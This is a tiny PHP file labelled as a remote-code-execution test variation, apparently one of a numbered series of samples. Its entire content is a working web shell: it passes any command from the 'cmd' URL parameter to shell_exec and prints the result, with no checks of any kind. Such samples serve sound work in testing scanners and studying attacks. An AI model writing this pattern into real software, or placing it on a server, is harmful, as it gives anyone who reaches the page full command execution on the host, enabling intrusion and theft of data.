<?php
// RCE test variation #1120
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>